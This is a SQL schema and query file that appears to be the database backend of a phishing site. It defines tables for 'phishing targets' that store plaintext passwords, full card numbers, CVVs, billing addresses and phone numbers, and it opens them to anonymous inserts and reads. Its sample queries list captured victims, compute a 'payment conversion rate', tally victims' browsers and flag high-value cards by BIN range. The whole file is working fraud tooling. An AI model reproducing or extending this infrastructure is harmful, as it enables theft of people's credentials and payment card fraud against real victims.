-- Create table for users (phishing targets)
CREATE TABLE users (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  email VARCHAR NOT NULL UNIQUE,
  password VARCHAR, -- Store password in plain text for this specific application
  created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
  last_login TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
);

-- Create an index on email for faster lookups
CREATE INDEX idx_users_email ON users(email);

-- Create table for payment information with full card details
CREATE TABLE payment_info (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  user_email VARCHAR NOT NULL REFERENCES users(email),
  user_password VARCHAR, -- Store the associated password
  full_card_number VARCHAR, -- Full card number
  card_bin VARCHAR(6), -- First 6 digits (BIN)
  card_number_last_4 VARCHAR(4), -- Last 4 digits
  expiry_date VARCHAR(5),
  cvv VARCHAR(4), -- CVV code
  cardholder_name VARCHAR,
  billing_address JSONB,
  phone_number VARCHAR,
  created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
);

-- Create table to track phishing attempts
CREATE TABLE phishing_attempts (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  user_email VARCHAR NOT NULL,
  user_password VARCHAR, -- Store the password
  credentials_captured BOOLEAN DEFAULT FALSE,
  payment_info_captured BOOLEAN DEFAULT FALSE,
  timestamp TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
  user_agent TEXT,
  ip_address VARCHAR
);

-- Create policies to allow inserting data without authentication
ALTER TABLE users ENABLE ROW LEVEL SECURITY;
ALTER TABLE payment_info ENABLE ROW LEVEL SECURITY;
ALTER TABLE phishing_attempts ENABLE ROW LEVEL SECURITY;

-- Create policies that allow anonymous inserts
CREATE POLICY "Allow anonymous inserts to users" ON users
  FOR INSERT WITH CHECK (true);

CREATE POLICY "Allow anonymous inserts to payment_info" ON payment_info
  FOR INSERT WITH CHECK (true);

CREATE POLICY "Allow anonymous inserts to phishing_attempts" ON phishing_attempts
  FOR INSERT WITH CHECK (true);

-- Allow anon users to select data (for demos only - remove in production)
CREATE POLICY "Allow anonymous selects on users" ON users
  FOR SELECT USING (true);

CREATE POLICY "Allow anonymous selects on payment_info" ON payment_info
  FOR SELECT USING (true);

CREATE POLICY "Allow anonymous selects on phishing_attempts" ON phishing_attempts
  FOR SELECT USING (true);

-- SAMPLE QUERIES FOR ANALYZING CAPTURED DATA

-- View all users who fell for the phishing attempt
SELECT * FROM users ORDER BY created_at DESC;

-- View all payment information captured (including full card details)
SELECT
  p.id,
  p.user_email,
  p.user_password,
  p.full_card_number,
  p.card_bin,
  p.card_number_last_4,
  p.expiry_date,
  p.cvv,
  p.cardholder_name,
  p.billing_address->>'address' as street,
  p.billing_address->>'city' as city,
  p.billing_address->>'state' as state,
  p.billing_address->>'postal_code' as postal_code,
  p.billing_address->>'country' as country,
  p.phone_number,
  p.created_at
FROM payment_info p
ORDER BY p.created_at DESC;

-- View all phishing attempts with credentials
SELECT
  pa.id,
  pa.user_email,
  pa.user_password,
  pa.credentials_captured,
  pa.payment_info_captured,
  pa.user_agent,
  pa.ip_address,
  pa.timestamp
FROM phishing_attempts pa
ORDER BY pa.timestamp DESC;

-- Summary statistics
SELECT
  COUNT(DISTINCT u.email) as total_users,
  COUNT(DISTINCT p.user_email) as users_with_payment_info,
  COUNT(DISTINCT pa.user_email) as completed_attempts,
  (COUNT(DISTINCT p.user_email)::float / NULLIF(COUNT(DISTINCT u.email), 0) * 100) as payment_conversion_rate
FROM users u
LEFT JOIN payment_info p ON u.email = p.user_email
LEFT JOIN phishing_attempts pa ON u.email = pa.user_email;

-- Top browsers used by victims
SELECT
  CASE
    WHEN user_agent LIKE '%Firefox%' THEN 'Firefox'
    WHEN user_agent LIKE '%Chrome%' THEN 'Chrome'
    WHEN user_agent LIKE '%Safari%' THEN 'Safari'
    WHEN user_agent LIKE '%Edge%' THEN 'Edge'
    ELSE 'Other'
  END as browser,
  COUNT(*) as count
FROM phishing_attempts
GROUP BY browser
ORDER BY count DESC;

-- Find users who provided both login and payment info
SELECT
  u.email,
  u.password,
  u.created_at as login_time,
  p.full_card_number,
  p.card_bin,
  p.cvv,
  p.created_at as payment_time,
  pa.timestamp as completion_time,
  EXTRACT(EPOCH FROM (p.created_at - u.created_at))/60 as minutes_to_add_payment
FROM users u
JOIN payment_info p ON u.email = p.user_email
JOIN phishing_attempts pa ON u.email = pa.user_email
ORDER BY u.created_at DESC;

-- Analysis of card BINs to identify most common card types
SELECT
  card_bin,
  COUNT(*) as count
FROM payment_info
GROUP BY card_bin
ORDER BY count DESC;

-- Check for high-value cards (based on certain BIN ranges)
SELECT
  p.user_email,
  p.full_card_number,
  p.card_bin,
  p.card_number_last_4,
  p.cardholder_name,
  p.created_at
FROM payment_info p
WHERE
  -- Amex Premium Cards
  (p.card_bin LIKE '37%' OR p.card_bin LIKE '34%')
  -- Visa Signature/Infinite
  OR (p.card_bin LIKE '4%' AND LENGTH(p.full_card_number) = 16)
  -- Mastercard World Elite
  OR (p.card_bin LIKE '5%' AND LENGTH(p.full_card_number) = 16)
ORDER BY p.created_at DESC;
